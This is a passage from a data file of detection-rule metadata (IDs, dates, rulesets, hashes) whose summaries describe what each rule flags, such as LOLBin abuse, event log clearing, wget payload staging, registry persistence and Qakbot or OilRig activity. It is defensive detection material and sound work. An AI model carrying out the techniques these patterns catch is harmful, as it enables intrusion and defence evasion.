  Updated-Date: '2024_09_04'
cbaa3ef3-07a9-4c8e-82d1-9e40578da7fd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2db872a2a7620b5fd9b7744ea93594c
  Ruleset: emerging-threats
  Summary: This rule detects the registry set activity of a value called "Seed" stored
    in the "\Cryptography\Providers\" registry key. The Kapeka backdoor utilizes this
    location to register a new SIP provider for backdoor configuration persistence.
  Updated-Date: '2024_09_03'
cbb56d62-4060-40f7-9466-d8aaf3123f83:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fa1b4df14d5783f62ace1dff7d5c4177
  Ruleset: sigmahq
  Summary: This rule detects the loading of the "Python Core" image by a process that
    is not associated with Python. This behavior could indicate the presence of a
    Python script that has been bundled using Py2Exe, a tool that converts Python
    scripts into standalone Windows programs.
  Updated-Date: '2024_09_04'
cbb67ecc-fb70-4467-9350-c910bdf7c628:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b9d30e1f09aad71f92334ebf9ffcfc68
  Ruleset: core
  Summary: This rule detects when a new credential is added to an existing application
    in Azure. The presence of additional credentials outside of normal expected processes
    could indicate a malicious actor attempting to use those credentials for unauthorized
    activities. Specific log entries related to updating application certificates,
    secrets management, and service principals are monitored to identify such events.
  Updated-Date: '2024_09_03'
cbb9e3d1-2386-4e59-912e-62f1484f7a89:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e0419782aaf9a702d8e66c04b155f164
  Ruleset: sigmahq
  Summary: This rule detects when the Console Window Host (conhost.exe) process is
    spawned by an uncommon parent process, which could indicate potential code injection
    activity. The detection focuses on specific parent processes that are unusual
    for spawning conhost.exe, such as explorer.exe, lsass.exe, regsvr32.exe, rundll32.exe,
    services.exe, smss.exe, spoolsv.exe, svchost.exe, userinit.exe, wininit.exe, and
    winlogon.exe. It also includes filters to exclude known benign instances related
    to specific command line patterns for svchost and Dropbox processes. The rule
    helps to identify suspicious activities that might suggest malicious actions within
    a Windows environment.
  Updated-Date: '2024_09_04'
cbe51394-cd93-4473-b555-edf0144952d9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4e9f6b68431512a75ee66cff8fcf3500
  Ruleset: core
  Summary: This rule detects a DNS server error where a specified plugin DLL (Dynamic
    Link Library) could not be loaded. It monitors events with IDs 150, 770, and 771
    within Windows DNS server logs to identify instances where the server encounters
    issues loading the plugin DLL, which is recorded in the registry. This kind of
    error can be indicative of a larger problem within the DNS server configuration
    or could potentially be used as part of an attack aimed at defense evasion.
  Updated-Date: '2024_09_03'
cbec226f-63d9-4eca-9f52-dfb6652f24df:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 583f5a606c2ede664f0fd3f456348da5
  Ruleset: core
  Summary: This rule detects suspicious parent processes that typically should not
    have any child processes or should have only a specific child process. It monitors
    for unusual child process creation patterns originating from a specified list
    of parent processes like 'minesweeper.exe', 'winver.exe', and 'bitsadmin.exe'.
    Additionally, it includes special parent processes such as 'csrss.exe', 'certutil.exe',
    'eventvwr.exe', 'calc.exe', and 'notepad.exe', filtering out benign child processes
    known to be associated with these specific parents, such as 'WerFault.exe', 'wermgr.exe',
    'conhost.exe', 'mmc.exe', 'win32calc.exe', and 'notepad.exe'. This rule aims to
    identify potentially malicious behavior indicative of defense evasion tactics
    and process injection, often associated with advanced persistent threats like
    Cobalt Strike.
  Updated-Date: '2024_09_03'
cbf93e5d-ca6c-4722-8bea-e9119007c248:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 720813b3762b6e5179b0aef26f694e6b
  Ruleset: sigmahq
  Summary: This rule detects modifications to autostart extensibility points (ASEPs)
    in the Windows registry. These modifications commonly involve specific subkeys
    under the `\SOFTWARE\Microsoft\Windows NT\CurrentVersion` path, including `\Winlogon`
    settings such as `VmApplet`, `Userinit`, `Taskman`, `Shell`, `GpExtensions`, `AppSetup`,
    `AlternateShells\AvailableShells`, as well as other areas like `Windows\IconServiceLib`,
    `Windows\Appinit_Dlls`, `Image File Execution Options`, `Font Drivers`, `Drivers32`,
    `Windows\Run`, and `Windows\Load`. The rule aims to detect potentially malicious
    alterations while filtering out common legitimate modifications by certain processes
    and software installations, ensuring that only suspicious changes trigger alerts.
  Updated-Date: '2024_09_04'
cc08d590-8b90-413a-aff6-31d1a99678d7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dec9d2c7dfea060f8c4cb953811e6eee
  Ruleset: emerging-threats
  Summary: This rule detects the creation of new printer ports that interact with
    suspicious files, potentially exploiting the CVE-2020-1048 vulnerability known
    as PrintDemon. The rule flags command lines that add new printer ports with names
    containing executable file types such as `.exe`, `.dll`, or `.bat`, or when a
    printer port is associated with "Generic / Text Only." This behavior might indicate
    an attacker attempting to gain persistence or execute malicious payloads via compromised
    printer ports.
  Updated-Date: '2024_09_03'
cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 08f924eeb0faa19e99f75be4ee3da977
  Ruleset: core
  Summary: This rule detects the execution of binaries by Devtoolslauncher.exe using
    the 'LaunchForDeploy' command. Devtoolslauncher.exe is known for potentially facilitating
    defense evasion techniques as it can be employed to execute other binaries on
    a Windows system. The rule flags such behavior, discerning it from legitimate
    uses, to identify potential malicious activity.
  Updated-Date: '2024_09_03'
cc368ed0-2411-45dc-a222-510ace303cb2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3c690956c9347017383ef1bcc159fa17
  Ruleset: sigmahq
  Summary: This rule detects the potentially suspicious execution of the Regasm and
    Regsvcs utilities from uncommon directories. Regasm and Regsvcs, which are often
    targeted for misuse in defense evasion techniques, are expected to run from specific
    standard locations. Unusual execution paths, such as temporary directories or
    startup folders, may indicate malicious activity. This rule aims to flag such
    irregular executions to identify potential threats early.
  Updated-Date: '2024_09_04'
cc36992a-4671-4f21-a91d-6c2b72a2edf5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 42dff22a69985f5f7291505a4735f995
  Ruleset: core
  Summary: This rule detects the clearing or modification of EventLog configurations
    using utilities such as "wevtutil," "powershell," and "wmic." These actions are
    indicative of techniques employed by threat actors and ransomware to evade detection
    by altering or removing EventLog data. Specifically, it looks for commands that
    clear logs, change log settings, or relocate log files and filters out benign
    activity related to system administration, script execution, or maintenance.
  Updated-Date: '2024_09_03'
cc4e02ba-9c06-48e2-b09e-2500cace9ae0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b759e026511a66a3ce5ae79b31237248
  Ruleset: core
  Summary: This rule detects potential exploitation of the globally writable Tasks
    folders in the System32 and SysWow64 directories on Windows systems. Adversaries
    may leverage these writable paths to load or influence script hosts or .NET applications,
    thereby executing malicious assemblies through tools such as cscript, wscript,
    regsvr32, mshta, and eventvwr. The detection mechanism monitors command lines
    containing keywords such as "echo," "copy," "type," or "file createnew" in conjunction
    with references to the Tasks folders in System32 or SysWow64.
  Updated-Date: '2024_09_03'
cc7abbd0-762b-41e3-8a26-57ad50d2eea3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 77652a85e6bd1c746163bf7a89f5c69a
  Ruleset: core
  Summary: This rule detects suspicious execution patterns of mshta.exe, focusing
    on file polyglotism, where mshta.exe is observed executing commands containing
    certain file extensions like .jpg, .png, .lnk, .xls, .doc, .zip, or .dll. This
    is notable as mshta.exe is a legitimate Windows utility typically used for executing
    HTML applications, but it can be exploited for malicious activities, such as bypassing
    security controls and executing arbitrary scripts or payloads, often in defense
    evasion or execution tactics.
  Updated-Date: '2024_09_03'
cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f80a6ade5681e70d02bfd5dcd33b1693
  Ruleset: sigmahq
  Summary: This rule detects the execution of `certutil` with the flags `-decode`
    or `-decodehex` to decode Base64 or hex-encoded files. This can be used by attackers
    to decode an encoded payload before its execution.
  Updated-Date: '2024_09_04'
cc9d3712-6310-4320-b2df-7cb408274d53:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8beb5da6a85eebdb246dfe437db0abab
  Ruleset: sigmahq
  Summary: This rule detects the execution of "lodctr.exe" used to rebuild performance
    counter registry values. Attackers can exploit this process by providing a malicious
    configuration file to overwrite performance counter configurations, thereby evading
    monitoring and security solutions.
  Updated-Date: '2024_09_04'
ccb5742c-c248-4982-8c5c-5571b9275ad3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1415e2eb65609828c11b6ef8270af2eb
  Ruleset: sigmahq
  Summary: This rule detects the execution of reconnaissance commands where the results
    are piped to "findstr" using inline calls of "cmd.exe" via the "/c" or "/k" options.
    Attackers often utilize this technique to extract specific information during
    their reconnaissance phase. The rule monitors command lines containing specific
    combinations such as 'ipconfig*|*find', 'net*|*find', 'netstat*|*find', 'ping*|*find',
    'systeminfo*|*find', 'tasklist*|*find', and 'whoami*|*find'.
  Updated-Date: '2024_09_04'
ccd55945-badd-4bae-936b-823a735d37dd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e8485ace3996153f375769fe9e02347b
  Ruleset: sigmahq
  Summary: This rule detects when the push protection feature is disabled for a GitHub
    organization, enterprise, specific repositories, or custom pattern rules. Push
    protection is a security feature designed to prevent the accidental inclusion
    of secrets in code repositories. Disabling this feature can indicate an attempt
    to bypass security measures and may be a sign of defense evasion tactics.
  Updated-Date: '2024_09_04'
cd0f7229-d16f-42de-8fe3-fba365fbcb3a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e40d2c643ca2c8e7ac86260ed61170ed
  Ruleset: core
  Summary: This rule detects the presence of obfuscated PowerShell scripts executed
    via Rundll32, specifically focusing on attempts to evade security measures. The
    detection is triggered by identifying specific patterns in the ServiceFileName,
    such as the inclusion of '&&', 'rundll32', 'shell32.dll', 'shellexec_rundll',
    and keywords like 'value', 'invoke', 'comspec', and 'iex'. This activity is indicative
    of potential defense-evasion techniques, and the alert is considered to indicate
    a high level of threat.
  Updated-Date: '2024_09_03'
cd185561-4760-45d6-a63e-a51325112cae:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 13c3780f060af9241df5760b32b7feb1
  Ruleset: core
  Summary: This rule detects the usage of a PowerShell command to perform a live memory
    dump on a Windows machine. The specific PowerShell command targeted by this rule
    is 'Get-StorageDiagnosticInfo' with the '-IncludeLiveDump' parameter. This can
    be indicative of attempts to capture the memory contents of a system, potentially
    for diagnostic or malicious purposes. Script Block Logging must be enabled for
    this detection to work effectively. False positives may arise from legitimate
    system diagnostics activities.
  Updated-Date: '2024_09_03'
cd1f961e-0b96-436b-b7c6-38da4583ec00:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c25f1d717f8812f06f1c6f47623497cb
  Ruleset: core
  Summary: This rule detects the execution of "logman.exe," a utility used for disabling
    or deleting Windows trace sessions. It triggers upon identifying specific command
    line arguments that stop or delete trace sessions, such as 'Circular Kernel Context
    Logger,' 'EventLog-,' 'SYSMON TRACE,' and 'SysmonDnsEtwSession.' This could indicate
    an attempt to evade defenses or tamper with logs.
  Updated-Date: '2024_09_03'
cd219ff3-fa99-45d4-8380-a7d15116c6dc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 32118d0208087568613e662a26a70f04
  Ruleset: sigmahq
  Summary: This rule detects the creation of new local user accounts through the "net.exe"
    command on Windows systems. When the command line contains both "user" and "add,"
    along with the image being "net.exe" or "net1.exe," this indicates that the "net.exe"
    utility has been used for user account creation. This activity can be legitimate
    but is also a common technique for maintaining persistence by creating unauthorized
    user accounts.
  Updated-Date: '2024_09_04'
cd277474-5c52-4423-a52b-ac2d7969902f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4443f11e3c3442ad59e3dd30dcfe6ef8
  Ruleset: sigmahq
  Summary: This rule detects the setting of a new registry value associated with the
    BgInfo application, which can be abused to execute custom WMI queries via "BgInfo.exe."
    BgInfo is a tool that displays system information on the desktop and manipulating
    its registry configurations could allow an attacker to run unauthorized WMI queries,
    potentially for malicious purposes.
  Updated-Date: '2024_09_04'
cd3a808c-c7b7-4c50-a2f3-f4cfcd436435:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 74d4f4ac6214714cb75b5151c3407e9f
  Ruleset: sigmahq
  Summary: This rule detects when a Google Cloud Kubernetes CronJob runs in Azure
    Cloud. Kubernetes Jobs, as controllers, are designed to create one or more pods,
    ensuring that a specified number of them successfully terminate. These Jobs are
    utilized for running containers that perform finite tasks suitable for batch jobs.
    Kubernetes CronJobs specifically schedule these tasks to run repeatedly at specified
    times. Adversaries may leverage Kubernetes CronJobs to schedule the execution
    of malicious code within the cluster, operating within containers.
  Updated-Date: '2024_09_04'
cd3d1298-eb3b-476c-ac67-12847de55813:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5667f7bc08cc926d63944d3f504d72f6
  Ruleset: sigmahq
  Summary: This rule detects the use of Rasautou.exe for the execution of arbitrary
    DLL files specified by the '-d' option and the execution of specific exports using
    the '-p' option. Rasautou.exe, typically a part of the Windows operating system,
    is leveraged in this context for unauthorized or malicious code execution. This
    detection is particularly relevant for Windows versions prior to Windows 10, as
    the specified options were removed in later versions. Command-line auditing through
    specific tools or updates is necessary to monitor and log these attempts effectively.
  Updated-Date: '2024_09_04'
cd479ccc-d8f0-4c66-ba7d-e06286f3f887:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 71991f48b1d6cfa585aa89383f3d554a
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of the vulnerability
    CVE-2021-26857. It identifies abnormal subprocesses spawned by the Exchange Server's
    Unified Messaging service (UMWorkerProcess.exe) and filters out common processes
    like wermgr.exe and WerFault.exe to reduce false positives. This vulnerability
    can be leveraged by attackers to execute unauthorized actions on affected systems,
    as reported in the context of targeting Exchange Servers by HAFNIUM. The rule
    is crucial for identifying and mitigating emerging threats targeting this specific
    vulnerability.
  Updated-Date: '2024_09_03'
cd55f721-5623-4663-bd9b-5229cab5237d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7ab0262ffc5e3139f991a62526381fc0
  Ruleset: sigmahq
  Summary: This rule detects instances where there has been an attempt to establish
    a new SSH connection to an SSH service running on an OpenCanary node. OpenCanary
    is a honeypot tool used to mimic various services and capture potential malicious
    activities for analysis. Detecting such connection attempts can help identify
    suspicious activities indicating potential unauthorized access or lateral movement
    within the network.
  Updated-Date: '2024_09_04'
cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 74ab65a31b4f93ba46229acd609b10e3
  Ruleset: sigmahq
  Summary: This rule detects the addition of a new rule to the Windows firewall using
    the netsh.exe utility. It identifies instances where the command-line interface
    is used to execute firewall modification commands that contain specific keywords
    indicating the addition of a new rule. The rule filters out certain known benign
    firewall rules, such as those associated with Dropbox, to reduce false positives.
    Potential triggers for this rule include legitimate administrative activities
    and software installations, aside from potential malicious actions aimed at evading
    defenses.
  Updated-Date: '2024_09_04'
cd71385d-fd9b-4691-9b98-2b1f7e508714:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 258a3cb3a9415e9e3c5a88c7ff85daa8
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "runexehelper.exe" binary as a proxy
    to launch other programs. This technique could be employed for defense evasion,
    as it uses a known legitimate binary to execute potentially malicious actions.
    The detection focuses on process creation events where the parent process image
    ends with "\runexehelper.exe". False positives are unknown for this rule. The
    context involves observing the behavior of this binary to ensure it is not being
    misused for unauthorized activity.
  Updated-Date: '2024_09_04'
cd764533-2e07-40d6-a718-cfeec7f2da7f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2385b188e7d42d6608ce057a5da78874
  Ruleset: core
  Summary: This rule detects the execution of the SysInternals DebugView tool when
    it has been suspiciously renamed. The focus is on identifying processes where
    the product is identified as Sysinternals DebugView, but the original file name
    remains 'Dbgview.exe' and the image path ends with '\Dbgview.exe'. This can indicate
    the tool has been used in a deceptive manner contrary to its intended use.
  Updated-Date: '2024_09_03'
cd8b36ac-8e4a-4c2f-a402-a29b8fbd5bca:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d28277b94d0dd431fc0835b25cfed3f4
  Ruleset: sigmahq
  Summary: This rule detects file write events to or from directories mimicking the
    recycle bin, such as "RECYCLER.BIN" or "RECYCLERS.BIN," which are frequently used
    by malware as staging areas. This suspicious activity can indicate the presence
    of an infection or unauthorized access, leveraging these fake folders for persistence
    or evasion.
  Updated-Date: '2024_09_04'
cd8c163e-a19b-402e-bdd5-419ff5859f12:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6f063f11e184be59f298b22f30e6283e
  Ruleset: core
  Summary: This rule detects command line parameters used by ADCSPwn, a tool designed
    to escalate privileges within an active directory network. It works by coercing
    authentication from machine accounts and then relaying this authentication to
    the certificate service.
  Updated-Date: '2024_09_03'
cd951fdc-4b2f-47f5-ba99-a33bf61e3770:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 391038d2e7939a10feb9bc3f2c63f209
  Ruleset: sigmahq
  Summary: This rule detects when the Windows Installer service (msiexec.exe) attempts
    to install MSI packages with SYSTEM privileges, which can indicate a potential
    privilege escalation attempt. It identifies such activity by examining process
    creation logs for specific patterns in the image path and user details. The rule
    filters out legitimate usage by system administrators, antivirus products (such
    as Sophos, Avira, and Avast), and Windows applications, ensuring it focuses on
    suspicious and potentially malicious activities.
  Updated-Date: '2024_09_04'
cdb15e19-c2d0-432a-928e-e49c8c60dcf2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 28c5575fd0967ae99fa8c07c396e8e82
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "mscorsvc.dll" by monitoring
    the loading of this specific DLL file and excluding instances where it is loaded
    from typical Microsoft .NET Framework and Windows Side-by-Side (WinSxS) directories.
    DLL sideloading is a technique used by attackers to execute malicious code by
    placing a rogue DLL file in a directory where it will be loaded by a vulnerable
    application. This rule helps to identify suspicious occurrences of "mscorsvc.dll"
    being loaded from non-standard locations, which may indicate malicious activity
    aimed at bypassing security mechanisms.
  Updated-Date: '2024_09_04'
cdc8da7d-c303-42f8-b08c-b4ab47230263:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 14591fd5f32e01ca9d2a4411fde2befd
  Ruleset: sigmahq
  Summary: This rule detects instances of the rundll32.exe process initiating network
    connections to public IP addresses. It excludes connections to local or private
    IP ranges, certain Microsoft IP ranges, specific application services, Azure-managed
    domains, and processes originating from svchost.exe that connect to port 443.
    This detection helps identify potential misuse of rundll32.exe for unauthorized
    or suspicious network activities, which can be indicative of defense evasion or
    execution tactics used by malware or unauthorized processes.
  Updated-Date: '2024_09_04'
cde0a575-7d3d-4a49-9817-b8004a7bf105:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b7fa13af73380631cfacb1be3dda7855
  Ruleset: sigmahq
  Summary: This rule detects when a new and uncommon rule has been added to the Windows
    Firewall exception list. It focuses on firewall-related event IDs like 2004, 2071,
    and 2097, which indicate that a new rule has been added to the Windows Defender
    Firewall exceptions. The rule aims to identify potentially malicious activities
    by filtering out routine or benign modifications done by common paths and applications,
    including Microsoft Defender and well-known system processes, while highlighting
    unusual changes which may indicate an attempt to bypass security measures for
    defense evasion purposes.
  Updated-Date: '2024_09_04'
cdeef967-f9a1-4375-90ee-6978c5f23974:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 79cbe02957d48388627301cae80de813
  Ruleset: sigmahq
  Summary: This rule detects modifications to application credentials in an Azure
    environment, specifically through updates related to certificates and secrets
    management, as logged in activity logs.
  Updated-Date: '2024_09_04'
ce5678bb-b9aa-4fb5-be4b-e57f686256ad:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ed226a196f6edd455edd0fbf60fe0a32
  Ruleset: sigmahq
  Summary: This rule detects logons using NTLM to hosts that are potentially not part
    of the domain within a Windows environment. It specifically looks for Event ID
    8001, where the target name starts with 'TERMSRV', indicating a potential Remote
    Desktop Connection. The log events required for detection are sourced from Microsoft-Windows-NTLM/Operational.
    This may help identify unauthorized remote desktop sessions, a tactic often associated
    with command and control activities.
  Updated-Date: '2024_09_04'
ce6e34ca-966d-41c9-8d93-5b06c8b97a06:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8fca7be56bc0c0107193ae6717d8404e
  Ruleset: emerging-threats
  Summary: This rule detects activity associated with the OilRig Advanced Persistent
    Threat (APT) group as documented by Nyotron in their March 2018 report. Specifically,
    it identifies process creation events on Windows systems that match certain patterns
    indicative of OilRig's known behavior. This includes scheduled tasks with specific
    command lines, executable files residing in the Windows Temp directory, the execution
    of a service with certain command line parameters, and instances where the AutoIt
    script execution utility is used with particular parameters.
  Updated-Date: '2024_09_03'
ce7066a6-508a-42d3-995b-2952c65dc2ce:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4b9fe8bf586e470946dfd082385c5438
  Ruleset: sigmahq
  Summary: This rule detects the creation of suspicious binary files, specifically
    those with the extensions ".dll", ".exe", and ".sys", inside the directory "\windows\system32\spool\drivers\color\"
    on Windows systems. This activity is indicative of potential malicious behavior,
    as outlined in related security blogs.
  Updated-Date: '2024_09_04'
ce72ef99-22f1-43d4-8695-419dcb5d9330:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e296f3200e6b98be594158d5688ed259
  Ruleset: core
  Summary: This rule detects suspicious activity involving the manipulation of critical
    Windows services using executable binaries such as 'net', 'sc', or 'powershell'.
    It identifies attempts to stop, pause, disable, or delete essential services,
    which are tactics commonly seen in ransomware attacks. The targeted services include
    antivirus programs, backup services, and other important system services. This
    detection method analyzes command lines and service names to identify potential
    tampering activities, which may indicate malicious intent or nefarious scripts
    trying to disable defense mechanisms and disrupt system operations.
  Updated-Date: '2024_09_03'
ce7cf472-6fcc-490a-9481-3786840b5d9b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2834a31207b1166739a90e8fc9d50572
  Ruleset: sigmahq
  Summary: This rule detects the execution of an SCT script using the `scrobj.dll`
    library invoked by the `InfDefaultInstall.exe` utility through a specially crafted
    INF file. This technique is commonly associated with tactics for defense evasion
    as identified in threat intelligence references.
  Updated-Date: '2024_09_04'
cea2b7ea-792b-405f-95a1-b903ea06458f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75bd877e89bf1270f62a5158114e9865
  Ruleset: core
  Summary: This rule detects suspicious child processes originating from the "Manage
    Engine ServiceDesk Plus" Java web service. It identifies instances where processes
    such as AppVLP.exe, bash.exe, bitsadmin.exe, calc.exe, certutil.exe, cscript.exe,
    curl.exe, forfiles.exe, mftrace.exe, mshta.exe, net.exe, net1.exe, notepad.exe,
    powershell.exe, pwsh.exe, query.exe, reg.exe, schtasks.exe, scrcons.exe, sh.exe,
    systeminfo.exe, whoami.exe, wmic.exe, and wscript.exe are spawned from the ServiceDesk
    directory or java.exe. Specific process-command line combinations, like net.exe
    or net1.exe with the command 'stop', are filtered out to reduce false positives.
    The rule aims to flag potentially malicious activities such as command-and-control
    operations and unauthorized administrative actions.
  Updated-Date: '2024_09_03'
cea72823-df4d-4567-950c-0b579eaf0846:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5aed9d0f40cd12378644a401a95836d6
  Ruleset: sigmahq
  Summary: This rule detects the execution of potentially malicious dropper scripts
    through the Windows Script Host (wscript.exe and cscript.exe), specifically focusing
    on scripts located in user directories. The detection criteria include the presence
    of script execution commands with file paths indicating temporary or public user
    directories (such as Temp, Tmp, Users\Public, Windows\Temp, and AppData\Local\Temp)
    and script file extensions (such as .js, .jse, .vba, .vbe, .vbs, and .wsf). This
    could indicate malicious activity leveraging script files to potentially compromise
    system security.
  Updated-Date: '2024_09_04'
ceb407f6-8277-439b-951f-e4210e3ed956:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1468dc8d6da8a98c7445d52c5069bde4
  Ruleset: core
  Summary: This rule detects the use of specific commands within Cisco network operating
    systems that are utilized to clear command history. This activity is commonly
    associated with defense evasion techniques, where malicious actors attempt to
    remove traces of their actions by deleting log entries. The detection focuses
    on identifying instances where 'clear logging' or 'clear archive' commands are
    executed. While such commands can be executed legitimately by administrators,
    their usage can also indicate potential malicious behavior aimed at obscuring
    unauthorized activities.
  Updated-Date: '2024_09_03'
ceb55fd0-726e-4656-bf4e-b585b7f7d572:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3f1a462a7ca71dee736b3393257fb95b
  Ruleset: core
  Summary: This rule detects suspicious activities involving the creation of rules
    that delete or move messages or folders within a user's inbox. These actions might
    signify malicious attempts to control or hide email communications. The detection
    is based on identifying the specific risk event type 'mcasSuspiciousInboxManipulationRules'
    in the logs generated by the Azure RiskDetection service. Such suspicious actions
    can be indicative of attack techniques related to defense evasion and other malicious
    maneuvers.
  Updated-Date: '2024_09_03'
cec8e918-30f7-4e2d-9bfa-a59cc97ae60f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6ed24da6f3229ea61f6d102deef6b9a1
  Ruleset: core
  Summary: This rule detects instances of the Windows process OpenWith.exe executing
    another binary file. OpenWith.exe is typically associated with opening files using
    a specified program, and its use in this context may indicate attempts at evasion
    tactics or unauthorized binary execution. The detection focuses on the process
    creation logs for instances where OpenWith.exe is invoked with a command line
    argument containing '/c'.
  Updated-Date: '2024_09_03'
cf0c254b-22f1-4b2b-8221-e137b3c0af94:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1db8487ea1ca9db842629a9216505d5f
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Impersonate tool, which can manipulate
    tokens on Windows computers either remotely using tools such as PsExec or WmiExec
    or interactively. The execution can be identified by specific command-line arguments
    including 'list', 'exec', or 'adduser', as well as by distinctive file hashes,
    such as certain MD5, SHA256, and IMPHASH values. This tool can potentially be
    used in privilege escalation and defense evasion attacks.
  Updated-Date: '2024_09_04'
cf1dbc6b-6205-41b4-9b88-a83980d2255b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d4640ce02f89b9722b58255c79771f5a
  Ruleset: sigmahq
  Summary: This rule detects when an API token is revoked in an Okta environment,
    signaling potential unauthorized access or alteration in the system.
  Updated-Date: '2024_09_04'
cf2e938e-9a3e-4fe8-a347-411642b28a9f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e3ad21af7236e9aa4b4b9f4198c57a42
  Ruleset: core
  Summary: This rule detects changes to the PowerShell execution policy registry key
    to bypass signing requirements for script execution from the CommandLine, identifying
    potential tampering aimed at executing scripts under less restrictive policies
    such as 'Bypass,' 'RemoteSigned,' or 'Unrestricted.'
  Updated-Date: '2024_09_03'
cf610c15-ed71-46e1-bdf8-2bd1a99de6c4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1326ea267e25ff419bcbd4856718af54
  Ruleset: sigmahq
  Summary: This rule detects the use of the command-line utility `wget` to download
    files into potentially suspicious directories, specifically targeting downloads
    into the `/tmp/` directory on Linux systems. The rule identifies command-line
    arguments that specify the output document location, using regex to ensure the
    case-sensitive detection of these arguments. This detection is relevant for identifying
    potential command-and-control activities, as malicious actors often utilize `wget`
    to fetch and store payloads or tools in temporary directories for further exploitation.
  Updated-Date: '2024_09_04'
cf879ffb-793a-4753-9a14-bc8f37cc90df:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 99c3aaa6f9f784183f7083ad5bbdb8f8
  Ruleset: emerging-threats
  Summary: This rule detects specific process tree behavior of a "rundll32.exe" execution
    often associated with potential Qakbot activity. Qakbot, also known as QBot, is
    a form of malware primarily used for financial theft and credential harvesting.
    The detection criteria focus on the parent process images like "cmd.exe," "cscript.exe,"
    "curl.exe," "mshta.exe," "powershell.exe," "pwsh.exe," and "wscript.exe," combined
    with specific "rundll32.exe" command line arguments that reference directories
    such as "ProgramData," "Users\Public," "AppData\Local\Temp," and "AppData\Roaming."
